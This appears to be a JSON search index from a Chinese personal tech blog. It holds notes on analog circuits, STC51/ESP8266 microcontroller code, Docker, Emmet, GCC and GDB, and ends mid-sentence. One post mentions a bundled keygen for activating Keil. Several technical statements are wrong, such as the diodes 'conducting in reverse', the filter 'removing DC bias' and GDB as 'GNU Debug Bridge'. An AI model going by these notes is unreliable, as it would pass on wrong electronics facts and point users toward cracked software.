另外还可以假设法解题。因为钳制效应的作用，所以只有一个管子会导通。因此，假设一个管导通，如果一个管导通，其他管不导通，则假设正确。 正向限幅电路正向限幅电路可以将输入信号的负半周全部截去，只保留正半周。 当输入信号为正半周时，二极管正向导通，输出信号等于输入信号；当输入信号为负半周时，二极管反向截止，输出信号为0V。因此，正向限幅电路可以将输入信号的负半周全部截去，只保留正半周。 上面就是一个反向截止电路。 反向限幅电路反向限幅电路可以将输入信号的正半周全部截去，只保留负半周。 当输入信号为负半周时，二极管反向导通，输出信号等于输入信号；当输入信号为正半周时，二极管正向截止，输出信号为0V。因此，反向限幅电路可以将输入信号的正半周全部截去，只保留负半周。 限幅电路的应用非常广泛，例如在音频放大器中，可以用限幅电路来保护扬声器，防止过载损坏；在通信电路中，可以用限幅电路来保护接收机，防止过大的信号干扰接收机正常工作。 二极管门电路二极管门电路是一种常用的电路，可以将输入信号的幅值限制在一定范围内。二极管门电路的基本原理是利用二极管的导通特性，将输入信号限制在二极管正向导通电压范围内。当输入信号超过二极管正向导通电压时，二极管开始导通，输出信号等于输入信号减去二极管正向导通电压；当输入信号小于二极管正向导通电压时，二极管反向截止，输出信号为0V。 常见的二极管门电路有正向门电路和反向门电路。 正向门电路正向门电路可以将输入信号的负半周全部截去，只保留正半周。当输入信号为正半周时，二极管正向导通，输出信号等于输入信号减去二极管正向导通电压；当输入信号为负半周时，二极管反向截止，输出信号为0V。因此，正向门电路可以将输入信号的负半周全部截去，只保留正半周。 反向门电路反向门电路可以将输入信号的正半周全部截去，只保留负半周。当输入信号为负半周时，二极管反向导通，输出信号等于输入信号减去二极管正向导通电压的相反数；当输入信号为正半周时，二极管正向截止，输出信号为0V。因此，反向门电路可以将输入信号的正半周全部截去，只保留负半周。 整流电路整流电路是将交流电信号转换为直流电信号的电路。在整流电路中，二极管起到了关键作用。常见的整流电路有半波整流电路和全波整流电路。 半波整流电路半波整流电路是将输入信号的负半周全部截去，只保留正半周。输入信号为正半周时，二极管正向导通，输出信号等于输入信号；当输入信号为负半周时，二极管反向截止，输出信号为0V。因此，半波整流电路可以将输入信号的负半周全部截去，只保留正半周。 全波整流电路全波整流电路是将输入信号的负半周翻转成正半周，再与正半周相加得到完整的正半周信号。当输入信号为正半周时，D1正向导通，输出信号等于输入信号；当输入信号为负半周时，D2正向导通，输出信号等于输入信号的相反数。因此，全波整流电路可以将输入信号的负半周翻转成正半周，再与正半周相加得到完整的正半周信号。 滤波电路在整流电路中，由于二极管的导通特性，输出信号仍然存在直流偏置。为了去除这种直流偏置，需要加入滤波电路。常见的滤波电路有电容滤波电路和电感滤波电路。 二极管电路分析对于二极管电路的分析，需要掌握二极管的伏安特性、电容效应、温度特性等基本特性，以及二极管的参数和模型。常用的二极管模型有理想模型、恒压降模型和折线模型。在实际电路中，可以根据需要选择不同的模型进行分析。","link":"/2022/12/21/%E7%89%A9%E7%90%86/%E6%A8%A1%E6%8B%9F%E7%94%B5%E8%B7%AF/%E6%A8%A1%E7%94%B5%EF%BC%9A%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%99%A8%E4%BB%B6/"},{"title":"STC51单片机学习记录","text":"准备工作软件&amp;资料下载实验板到手，第一步当然是下载资料啦。自然要去官网下载： stc官网：http://www.stcmcu.com 顺便，这官网挺瞎眼的（ 由于官网过于瞎眼，故将下载链接直接贴出来。 STC-ISP软件V6.88F版 这个是烧录用的工具。 Keil uVision5 直接放上下载站的链接。直链在此：点击下载（不一定稳定）。下载站上有注册教程。 STC89C51RC用户手册 大致流程初步练习后，大致梳理如下。 构思&amp;设计电路。没啥好说的，咱也不会，就……边做边查呗（ 写好程序。个人习惯vim/vs code，比较方便。只要引入头文件 reg52.h ，后续开发照着C语言通常的流程即可。 编译程序。使用上文提供的 Keil 编译程序，生成.hex文件（其实我挺好奇能不能用gcc……虽然估计不行）。这个.hex文件（看后缀，即十六进制文件）就是目标程序了。 烧录程序。使用上面提到的 STC-ISP 工具进行烧录即可。烧录操作后面写，可先参考这篇文章。 好了，到这里就是测试程序了（回想起被wer支配的恐惧）。 FAQ（Frequently asked questions） Q：打开Keil新建工程，找不到stc51单片机怎么办？A：看这儿。用stc-isp导入一下数据库到keil安装目录就好了。 Q:Keil要激活才能用？A:别担心，网上激活教程一大把。看这儿。文章里提到的注册机，已经包含在了我提供的Keil安装包里，下好之后照着文章操作就好。 Q:烧录程序失败？A:stc51通病（貌似）。烧录按钮点了之后断一下开发板的电，然后重新上电即可。 开发板到了。所以储物间又上了一本资料。还挺全的，初期入门用吧。 第一课：LED闪烁代码其实很简单。MCU的编程方式和传统C语言程序相比挺怪的。代码如下： 12345678910111213141516171819202122232425/*Example-1_switch-led*/#include &quot;reg52.h&quot;typedef unsigned int u16;sbit LED=P2^0; sbit LED_1=P2^1;void delay(u16 i){ while(i--);}void main(){ LED_1=0; while(1) { LED=0; delay(50000); LED=1; delay(50000); }} 写完之后，keil编译生成.hex文件，丢到stc-isp里一下载，完事儿。目测成功。不过这里面还有一点坑： 编译之后，如果没有生成.hex文件，那多半是没设置output生成.hex文件，照着底下几张图设置一下就能解决了。 点击下图这个魔术棒标志。 如下图，勾选Create hex file即可。 然后编译。输出的信息里有下图这样的creating hex file from XXX就说明应该没啥问题。 概览回头看看这个程序。它和传统C语言程序的区别主要是这几点： 多了个头文件reg51.h/reg52.h。这个头文件对于单片机编译很重要 使用循环来达到延时的目的。上面的程序就使用了while循环来延时 通过设置sbit类型变量的值为1/0实现对应引脚高低电平的转换 其他的，基本和常规C语言没什么区别。所以，后面主要学习的，应该就是引脚的相关内容了。 第二课：用ESP8266实现通信《关于我报名比赛后才开始学MCU编程这件事》 ESP8266因为便宜和足够强大，所以在物联网上有着很广泛的应用。它的使用也比较简单，指令较少。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#include &quot;reg52.h&quot;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define uchar unsigned char#define uint unsigned intuchar ReceiveData[5]; //回传的数组uchar countnumber;void uart_init() //串口的初始化{ //9600bps@11.0592MHz PCON &amp;= 0x7F; //波特率不倍速 SCON = 0x50; //8位数据,可变波特率 AUXR |= 0x40; //定时器1时钟为Fosc,即1T AUXR &amp;= 0xFE; //串口1选择定时器1为波特率发生器 TMOD &amp;= 0x0F; //清除定时器1模式位 TMOD |= 0x20; //设定定时器1为8位自动重装方式 TL1 = 0xDC; //设定定时初值 TH1 = 0xDC; //设定定时器重装值 ET1 = 0; //禁止定时器1中断 TR1 = 1; //启动定时器1 EA = 1; ES = 1;}void delayms(uint xms) //延时{ uint i, j; for (i = xms; i &gt; 0; i--) for (j = 110; j &gt; 0; j--) ;}void Sent_ZF(uchar dat) //发送一个字节{ ES = 0; TI = 0; SBUF = dat; while (!TI) ; TI = 0; ES = 1;}void send(uchar *string) //发送字符串{ while (*string) { Sent_ZF(*string++); }}void Uart1() interrupt 4 //串口1 接收数据4wei（收到8266回传的OK，其实是\\r\\nOK）{ //当然是因为目前8266里面刷的AT固件是出厂默认固件 uchar a; if (RI == 1) { //RI=0; //复位中断请求标志,接收数据后置1 a = SBUF; //接收数据 RI = 0; //复位中断请求标志,接收数据后置1 *(ReceiveData + countnumber) = a; countnumber++; if (countnumber &gt; 4) { countnumber = 0; } }}uchar data_compare(uchar *p) //比较字符串{ if (strstr(ReceiveData, p) != NULL) return 1; else return 0;}void wifi_init() //初始化wifi模块{ while (1) { send(&quot;AT+RST\\r\\n&quot;); //往串口发重启指令 if (data_compare(&quot;OK&quot;)) break; delayms(600); //适当延时，给wifi模块一点反应时间 } memset(ReceiveData, 0, 5); while (1) { send(&quot;AT+CWMODE=1\\r\\n&quot;); //选择STA模式 if (data_compare(&quot;OK&quot;)) break; delayms(600); //适当延时，给wifi模块一点反应时间 } memset(ReceiveData, 0, 5); while (1) { send(&quot;AT+CIPMUX=0\\r\\n&quot;); //单通道模式 if (data_compare(&quot;OK&quot;)) break; delayms(600); //适当延时，给wifi模块一点反应时间 } memset(ReceiveData, 0, 5); while (1) { send(&quot;AT+CIPSTART=\\&quot;TCP\\&quot;,\\&quot;192.168.1.100\\&quot;,8080\\r\\n&quot;); //往串口发重启指令 if (data_compare(&quot;OK&quot;)) break; delayms(600); //适当延时，给wifi模块一点反应时间 } memset(ReceiveData, 0, 5); while (1) { send(&quot;AT+CIPMODE=1\\r\\n&quot;); //选择透传 if (data_compare(&quot;OK&quot;)) break; delayms(600); //适当延时，给wifi模块一点反应时间 } memset(ReceiveData, 0, 5); while (1) { send(&quot;AT+CIPSEND\\r\\n&quot;); //发送数据命令 if (data_compare(&quot;OK&quot;)) break; delayms(600); //适当延时，给wifi模块一点反应时间 } memset(ReceiveData, 0, 5);}void main(){ P27 = 0; //蜂鸣器 uart_init(); delayms(2000); wifi_init(); //就可连上服务端了 while (1) { //do something ; }}","link":"/2021/06/17/%E7%89%A9%E7%90%86/%E5%BE%AE%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/STC51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"模电：第二章-三极管","text":"三级管是模电中最重要的基础器件。其内部电流比较复杂，下面直接讨论其性质。 结构 ：三个掺杂区：base, emit, collect 三个电极：base, emit, collect 两个PN结：发射结，集电结 三极管有两类，PNP型和NPN型。 三极管特性三极管可以看作是两个二极管并起来构成的。如果是N和N并，那就是NPN型三极管；否则是PNP型三极管。下面的图中是NPN型三极管，如果是PNP型，则箭头从上册斜线指向左侧竖线（箭头指向N型的方向）。 三极管有三极，从上到下分别是C，B，E，分别是集电极，基极，发射极。对于NPN型三极管，电流流入C，B，从E流出；PNP型反之。 性质 电流关系（满足KCL关系）：$I_C+I_B=I_E$ 电流控制放大作用（基极电流控制集电极电流）：$I_C=\\beta I_B$ 比例分配关系：$i_B:i_C:i_E=1:\\beta:1+\\beta$ $\\beta$称为（共射）电流放大系数。直流情况下的放大关系近似等于交流状态的放大关系。 也就是说，三极管的输入是$I_B$和$U_{BE}$，输出是$I_C$和$U_{CE}$。 这是简化的基本电流方向关系（忽略$I_{CEO}$等电流）。 晶体管的伏安特性曲线有两个图，因为它有三个端口。需要记住的是伏安特性的对应关系： 输入伏安关系：输入电流和发射结电压$U_{BE}$的关系 输入伏安特性是发射结的电流-电压关系，而发射结也是PN结，所以曲线也是一个指数曲线。但是它跟管压降有关，然而一般可以只画一条曲线来表示。 输出伏安特性：集电极电流和管压降$U_{CE}$的关系 工作状态： 发射结反偏（$u_{BE}&lt;U_{on}$）：截止区 发射结正偏（$u_{BE}\\geq U_{on}） 集电结反偏：放大区（$u_{BC}&lt;0$） 集电结正偏：饱和区（$u_{BC}&gt;0$） 放大区的电位特点： NPN管：$u_C\\geq u_B&gt;u_E,u_{BE}=0.7V/0.2V$ NPN管：$u_C\\leq u_B&lt;u_E,u_{EB}=0.7V/0.2V$ 已知端电压，区分二极管种类时，两个相差0.2/0.7V的端口一定是b和e极。剩下的一个电位最高则是NPN，否则是PNP。然后再结合上面的等式分析b和e是分别是哪个： 判断能否正常工作，首先看管子类型，其次看电位关系是否正确。同时，看电流是否合理（有没有保护电阻）。 用上面的方法，和KCL、KVL，就能求解下面的工作状态：","link":"/2023/06/05/%E7%89%A9%E7%90%86/%E6%A8%A1%E6%8B%9F%E7%94%B5%E8%B7%AF/%E6%A8%A1%E7%94%B5%EF%BC%9A%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%B8%89%E6%9E%81%E7%AE%A1/"},{"title":"模电：第三章-放大电路分析方法","text":"集电极放大电路 电路分析使用静态分析和动态分析两种方式，分别针对直流通路和交流通路。前者确定其静态工作点，后者确定其放大参数。 静态分析 原理：KCL，列写方程如下：$V_{cc}=I_{BQ}R_b+U_{BEQ}+I_{EQ}R_e$ 从而得到$Q(I_{BQ},I_{CQ},U_{CEQ})$如下： $I_{BQ}=\\frac{V_{CC}-U_{BEQ}}{R_b}$ $I_{CQ}=\\beta I_{BQ}$ $U_{CEQ}=V_{CC}-I_{EQ}R_e=V_{CC}-I_{CQ}R_c$ 动态分析：利用微变等效电路 交流输入电阻：$r_{be}=r_{bb’}+\\beta\\frac{U_T(26mv)}{I_{CQ}}$ 电压放大倍数：$A_u=\\frac{U_o}{U_i}=-\\beta\\frac{R_L’(=R_C//R_L)}{R_{be}}$ 输入电阻：$R_i=\\frac{U_i}{I_i}=R_b//r_{be}$ 输出电阻：$R_o=R_c$ 失真现象： 注意：下面的讨论限于NPN型电路，PNP型需要反过来理解。 消除方法 Q点过高：$I_{BQ}$偏大 饱和失真（底部失真） 增大$R_b$ Q点过低：$I_{BQ}$偏小 截止失真（顶部失真） 减小$R_b$ 功率电子电路：还有一种失真是针对乙型功率放大电路的，它将两个三极管组合起来分别放大正版周期和负半周期。在接近$U$轴时，两个三极管均会进入截止区，此时信号会出现交越失真。 共基极放大电路特点：电压跟随、输入电阻大、输出电阻小 多级放大电路 耦合方式 阻容耦合 各级静态工作点独立，便于分析设计 难以大规模集成 不能放大直流信号和低频信号 直接耦合 各级静态工作点不独立，存在零点漂移（温度变化造成） 可以大规模集成 能同时放大直流信号和低频信号 它的放大倍数等于各级放大倍数的乘积。它的动态/静态分析从输入端到输出端进行。 差动放大电路它使用外部干扰作用于两个端口上的干扰信号程度一致这个特性，将输入分为共模/差模信号，以将干扰抵消。 负反馈电路 负反馈 降低放大倍数 开环放大倍数：$A=\\frac{X_o}{X_i}$ 闭环放大倍数：$A_f=\\frac{A}{1+AF}$ 提高放大倍数稳定性 减小非线性失真 展宽放大电路通频带 影响输入、输出电阻 串联反馈：输入电阻增大 并联反馈：输入电阻减小 电压型负反馈：输出电阻减小 电流型负反馈：输出电阻增大 集成运算放大器一个三端口元器件，输入$U_{i1}(-)$和$U_{i2}(+)$，输出$U_o$。 $U_o=A_{od}(U_{i2}-U_{i1})=A_{od}\\cdot U_i$ $U_o=(1+\\frac{R_F}{R_1})U_1$ 理想化条件 开环电压放大倍数趋于无穷：$A_{uo}=\\infty$ 输入电阻值趋于无穷：$r_{id}=\\infty$ 输出电阻值近似为0：$r_o=0$ 共模抑制比趋于无穷 虚短：两输入端电压非常接近于0：$u_+=u_-$虚断：输入端虽不断却无电流：$i_+=0,i_-=0$","link":"/2023/06/13/%E7%89%A9%E7%90%86/%E6%A8%A1%E6%8B%9F%E7%94%B5%E8%B7%AF/%E6%A8%A1%E7%94%B5%EF%BC%9A%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%94%BE%E5%A4%A7%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/"},{"title":"Docker使用笔记","text":"安装各种发行版都不一样，Arch直接sudo pacman -S docker就行。 安装完毕后，输入sudo systemctl enable --now docker.service启动Docker服务。 权限配置想不用sudo就用Docker，那就得配置用户组权限： 12sudo groupadd docker # ensure the usergroup docker existssudo usermod -aG docker $USER # add curr user to docker group 镜像加速#我使用的是阿里云镜像 安装／升级Docker客户端 推荐安装1.10.0以上版本的Docker客户端，参考文档docker-ce 配置镜像加速器 12345678root@Ubuntu:~# vim /etc/docker/daemon.jsonroot@Ubuntu:~# sudo systemctl daemon-reloadroot@Ubuntu:~# sudo systemctl restart dockerroot@Ubuntu:~# cat /etc/docker/daemon.json{ &quot;registry-mirrors&quot;: [&quot;https://xxxxxx.mirror.aliyuncs.com&quot;]} 最后使用docker info 就可以查看是否更换镜像成功。 使用指南离线使用 最近国内docker镜像都歇菜之后，倒也该了解下这方面的知识了 假设目标设备已经安装docker，但是无法正常使用docker pull。那么找到一个有网络条件的设备，使用docker pull命令从Docker Hub或其他仓库拉取所需的镜像。完成后，使用docker save命令将镜像保存到文件中： 1docker save -o /path/to/image.tar imageName:tag 完成后，将生成的.tar文件复制到存储介质中。 在无网络设备上插上你的存储设备，使用docker load命令从.tar文件中加载镜像： 1docker load -i /path/to/image.tar 后续用法就没啥区别了。 疑难杂症tls: failed to verify certificate: x509: certificate signed by unknown authority现象是，在容器内会发现https连接不可用，都会报上面的错误。但是容器的宿主机连接正常。 报错内容是证书由未知机构签署。原因是基于https的web连接基于tls机制来认证连接双方可信，并且不会存在中间人攻击（即，在你到服务器的通信中，第三方几乎不可能解密你们加密后的通信内容）。但是因为基于tls可信原理的条件进行推导，最终会得出必须存在一个可信根证书预先分发给客户端的结论。 x509是一个标准，它定义了公钥证书的格式，这些证书用于TLS和其他加密通信。 所以，上面的错误表示证书部分出现错误。未知证书表示客户端没有信任签发服务器证书的证书颁发机构（CA）。客户端的信任存储中没有包含该CA的证书，因此无法验证服务器证书的有效性。 因此鉴定为容器镜像里边缺tls证书了。 解决方案 在容器中执行apt-get install ca-certificates 在映射中添加如下映射：/etc/ssl/certs/ca-certificates.crt:/etc/ssl/certs/ca-certificates.crt 在映射中添加如下映射：/usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro 如果是ubuntu:latest的话，那大概率已经安装ca-certificates，执行2，3尝试即可。 参考文献 Docker官方文档：https://docs.docker.com/","link":"/2023/10/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Docker%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"},{"title":"Emmet学习笔记","text":"大半夜刷到的…老早就想学学这玩意了，奈何不知道名字是啥一直没法搜。 参考资料：Abbreviations Syntax | Emmet Doc Abbreviations are the heart of the Emmet toolkit: these special expressions are parsed in runtime and transformed into structured code block, HTML for example. The abbreviation’s syntax looks like CSS selectors with a few extensions specific to code generation. So every web-developer already knows how to use it. 语法元素html定义的所有标签均可以直接由标签名称补全：比如div-&gt;&lt;div&gt;&lt;/div&gt; 子元素二元运算符&gt;标记标注前一元素的子元素，例如div&gt;ul-&gt;&lt;div&gt;&lt;ul&gt;&lt;/ul&gt;&lt;/div&gt; 同级元素二元运算符+标识元素的同级元素，例如div+p-&gt;&lt;div&gt;&lt;/div&gt;&lt;p&gt;&lt;/p&gt; 返回上一级^标识指引当前缩进层次往上一级，例如div&gt;p^span-&gt;` 数量算符二元运算符*指示左侧元素数量为右侧整数个，例如div*5-&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt; 分组可以使用()对符号进行分组：div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p-&gt; 1234567891011&lt;div&gt; &lt;header&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/header&gt; &lt;footer&gt; &lt;p&gt;&lt;/p&gt; &lt;/footer&gt;&lt;/div&gt; 注意，括号可以嵌套：(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p-&gt; 12345678910111213&lt;div&gt; &lt;dl&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;/dl&gt;&lt;/div&gt;&lt;footer&gt; &lt;p&gt;&lt;/p&gt;&lt;/footer&gt; 理论上你可以用一个缩写来编写一整页，但是实际最好不要这么做。 属性选项对于标签，可以使用.标记添加class，#添加id，[a=&quot;xxx&quot; b=&quot;3&quot;]添加自定义标签。 编号使用*操作符时，可以在元素名称，属性名称，属性值插入$来加入从1开始的序号。连续的$出现时，高位默认填0。比如：ul&gt;li.item$*5-&gt; 1234567&lt;ul&gt; &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;&lt;/ul&gt; 另外在$操作符后，可以用@修改起始值，递增/递减。语法为：$@-3，$@-，$@3。得到的结果分别为序号递减到3，序号递减到1,序号从3递增。 文本用{}包裹文本，可以将文本包含在元素标签对中：a{click me}==a&gt;{click me}-&gt;&lt;a href=&quot;&quot;&gt;click me&lt;/a&gt; 但是注意，第一种写法的优先级最高，第二种写法中，{}和一般标签等价。 终结符空格是Emmet的默认终结符，因此，不能用空格提升可读性。此外，Emmet可以在任何位置使用，不一定是空行开头。 工具 snippets.json中包含Emmet的数据，也可以在这里定义自己的别名 部分标签（例如div.content）可省略标签名，Emmet可直接推导出 Lorem lpsum生成工具：lorem可直接扩展为占位文本，也可以使用lorem10等控制占位文字数量 注Emmet还有CSS的snippets，不过我用的不多就没去看。","link":"/2024/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Emmet%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"GCC食用指北","text":"简介GCC是源自GNU项目的一个开源[[C·C++|C/C++]]编译器。和它同样出自GNU的还有GNU/Linux。关于GCC的说明，如果你使用的是Linux，那么其实在安装的时候，它的使用手册也已经被释放到你的电脑上了。只需要键入 1root@xeonds:~# man gcc 即可阅读它的使用手册（不过是全英文版的）。在文章最后，我会贴出我个人翻译的版本。 用法一般用法很简单。只需输入： 1root@xeonds:~# gcc hello.c 即可。如果没有报错，则不会有任何输出。此时会在当前目录生成a.out文件，即目标程序。 如果想更改目标文件的文件名，你还可以这么调用： 1root@xeonds:~# gcc hello.c -o hello.exe 最终会生成hello.exe文件。 常见问题undefined reference to ‘dlopen’12345678910$ gcc DBSim.c/tmp/ccEdvduQ.o: In function `main':DBSim.c:(.text+0x38): undefined reference to 'dlopen'DBSim.c:(.text+0x55): undefined reference to 'dlerror'DBSim.c:(.text+0x9c): undefined reference to 'dlsym'DBSim.c:(.text+0xb7): undefined reference to 'dlsym'DBSim.c:(.text+0xd2): undefined reference to 'dlsym'DBSim.c:(.text+0x15d7): undefined reference to 'dlclose'collect2: error: ld returned 1 exit status 解决方案： 头文件添加：#include &lt;dlfcn.h&gt; 编译选项里加 -ldl 即： gcc DBSim.c -o DBSim -ldl 中文版文档（个人翻译）名称 gcc - 源于GNU项目的C/C++编译器 概要 1234567gcc [-c|-S|-E] [-std=standard] [-g] [-pg] [-Olevel] [-Wwarn...] [-Wpedantic] [-Idir...] [-Ldir...] [-Dmacro[=defn]...] [-Umacro] [-foption...] [-mmachine-option...] [-o outfile] [@file] infile... 只有最常用的选项被列出；其余选项请参阅后文。 g++接受和gcc几乎相同的选项。 描述 当你调用GCC时，它通常会进行预处理，编译，汇编和链接操作。这些“全部的”选项允许你将这个过程停止到中间阶段。例如，选项**-c**告诉编译器不要运行链接器。于是输出就由汇编器生成的object文件构成。 其他的选项被传递给一个或更多个编译阶段。一些选项控制预处理器，另一些选项控制编译器。然而其他的一些选项控制汇编器和链接器；它们中大多数未在此处列出，因为你极少会用到它们。 大多数你可以对GCC使用的命令行参数对于C程序而言都很有用；当一个参数只对一个语言（C++）有用时，说明文档会清楚地指出来。如果一个参数的描述没有提到源语言，那么你就可以在所有的支持语言中使用它。 运行GCC的一般方式是运行可执行程序gcc，或者当你运行交叉编译时是machine-gcc，又或者运行machine-gcc-version来执行某一特定版本的GCC。当你编译C++程序时，你应当使用g++来调用GCC。","link":"/2021/09/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/GCC%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8C%97/"},{"title":"GDB学习笔记","text":"GDB（GNU Debug Bridge）是一个二进制程序调试工具，适用于调试C和C++程序。这种二进制程序工具统称为bin-utils。类似的还有strace，一个跟踪程序系统调用的工具。 快速上手在此之前，编译程序时记得加上-g参数来生成调试信息。 1gcc main.c -g -o main 首先，使用gdb &lt;program&gt;启动gdb并加载程序。随后，使用break main在main函数入口设置断点，否则程序会直接执行完成。接着，使用run [args]执行程序并附加可选的参数。程序会在断点处停止，在这之后，就可以使用next（简写为n）或step单步执行，使用print expr打印表达式的值。完成后，用quit退出gdb。 解释说明 只有编译时加上了-g，gdb才能进行调试 next表示执行下一条语句而不进入函数内部；step则会进入函数内部 print expr可以输出表达式的值，一次一个参数。例如查看数组arr的第i个元素可以用print arr[i] GDB的几种模式GDB有多种模式，包括交互模式、批处理模式、远程调试模式等。交互模式是最常用的模式，用户可以在命令行界面中输入命令与GDB交互。批处理模式可以在不人工干预的情况下执行一系列GDB命令，通常用于自动化测试和调试。远程调试模式可以在远程主机上调试程序，通常用于嵌入式系统和分布式系统的调试。 交互模式 是最常用的模式，用户可以在命令行界面中输入命令与GDB交互。进入交互模式的方法是在命令行中输入gdb &lt;program&gt;，其中&lt;program&gt;是要调试的程序的可执行文件。交互模式的作用是让用户能够在程序执行过程中控制程序的执行，查看程序的状态，以及调试程序的错误。基本使用方法包括设置断点、运行程序、单步执行、打印变量值、查看函数调用栈等。 批处理模式 可以在不人工干预的情况下执行一系列GDB命令，通常用于自动化测试和调试。进入批处理模式的方法是在命令行中输入gdb -batch -x &lt;script&gt; &lt;program&gt;，其中&lt;script&gt;是包含GDB命令的脚本文件，&lt;program&gt;是要调试的程序的可执行文件。批处理模式的作用是让用户能够自动化执行一系列GDB命令，以便进行自动化测试和调试。基本使用方法包括设置断点、运行程序、单步执行、打印变量值、查看函数调用栈等。 远程调试模式 可以在远程主机上调试程序，通常用于嵌入式系统和分布式系统的调试。进入远程调试模式的方法是在命令行中输入gdb &lt;program&gt;，然后使用target remote &lt;host&gt;:&lt;port&gt;命令连接到远程主机，其中&lt;host&gt;是远程主机的IP地址或主机名，&lt;port&gt;是远程主机上GDB服务器的端口号。 GDB的软件结构可以分为以下几个部分： 前端：用户与GDB交互的界面，可以是命令行界面或者GUI界面。 后端：GDB的核心部分，负责解析用户输入的命令，控制程序的执行，以及与目标程序进行通信。 目标：被调试的程序，GDB通过与目标程序进行通信来控制其执行。 常用指令以下是GDB常用的指令： break：设置断点 run：运行程序 next（简写为n）：执行下一条语句而不进入函数内部 step（简写为s）：进入函数内部 print（简写为p）：打印表达式的值 backtrace（简写为bt）：打印函数调用栈 info：显示各种信息，如变量、寄存器、线程等 watch：设置观察点，当观察的变量被修改时停止程序执行 continue（简写为c）：继续执行程序直到下一个断点或程序结束 finish：执行完当前函数并返回到调用该函数的地方 set：设置变量的值 display：每次停在断点处时自动打印表达式的值 disable：禁用断点或观察点 enable：启用断点或观察点 delete：删除断点或观察点 高级功能除了常用指令外，GDB还有一些高级功能： 多线程调试GDB支持多线程调试。可以使用info threads命令查看当前线程列表，使用thread &lt;id&gt;命令切换到指定线程，使用break &lt;func&gt; thread &lt;id&gt;命令在指定线程中设置断点。 例如，我们有一个多线程程序test，其中有两个线程thread1和thread2，我们想在thread2中设置断点。首先，使用gdb test命令启动gdb并加载程序。接着，使用run命令运行程序。程序会在主线程中停止，使用info threads命令查看当前线程列表，找到thread2的ID。假设thread2的ID为2，使用thread 2命令切换到thread2，使用break &lt;func&gt; thread 2命令在thread2中设置断点。完成后，使用continue命令继续执行程序，程序会在断点处停止。 远程调试GDB支持远程调试，可以使用target remote &lt;host&gt;:&lt;port&gt;连接到远程主机，使用file &lt;path&gt;加载可执行文件，使用run运行程序。 调试核心转储文件当程序崩溃时，可以使用GDB调试核心转储文件。可以使用core &lt;file&gt;命令加载核心转储文件，使用bt命令查看函数调用栈。 调试动态链接库GDB可以调试动态链接库，可以使用set solib-search-path &lt;path&gt;设置动态链接库搜索路径，使用info sharedlibrary查看已加载的动态链接库，使用break &lt;func&gt;在动态链接库中设置断点。 调试汇编代码GDB可以调试汇编代码，可以使用layout asm查看汇编代码窗口，使用stepi单步执行汇编指令，使用disassemble &lt;func&gt;查看函数的汇编代码。 调试嵌入式系统GDB可以调试嵌入式系统，可以使用target remote &lt;host&gt;:&lt;port&gt;连接到嵌入式系统，使用set remotebaud &lt;baud&gt;设置串口波特率，使用monitor reset复位嵌入式系统，使用load加载可执行文件，使用run运行程序。 调试内核GDB可以调试内核，可以使用target remote &lt;host&gt;:&lt;port&gt;连接到内核，使用set architecture &lt;arch&gt;设置架构，使用set osabi &lt;osabi&gt;设置操作系统ABI，使用set solib-absolute-prefix &lt;path&gt;设置动态链接库路径，使用add-symbol-file &lt;file&gt; &lt;addr&gt;加载符号文件，使用break &lt;func&gt;在内核中设置断点。 调试追踪系统调用GDB可以调试追踪系统调用，可以使用catch syscall &lt;syscall&gt;设置系统调用断点，使用info catch查看系统调用断点，使用stepi单步执行系统调用。 调试追踪信号GDB可以调试追踪信号，可以使用catch signal &lt;signal&gt;设置信号断点，使用info catch查看信号断点，使用stepi单步执行信号处理函数。 调试追踪fork和execGDB可以调试追踪fork和exec，可以使用set follow-fork-mode &lt;mode&gt;设置fork和exec的跟踪模式，使用catch fork设置fork断点，使用catch exec设置exec断点，使用info catch查看fork和exec断点。 调试追踪动态内存分配GDB可以调试追踪动态内存分配，可以使用catch syscall brk设置brk系统调用断点，使用catch syscall sbrk设置sbrk系统调用断点，使用info catch查看brk和sbrk断点。 调试追踪文件操作GDB可以调试追踪文件操作，可以使用catch syscall open设置open系统调用断点，使用catch syscall close设置close系统调用断点，使用catch syscall read设置read系统调用断点，使用catch syscall 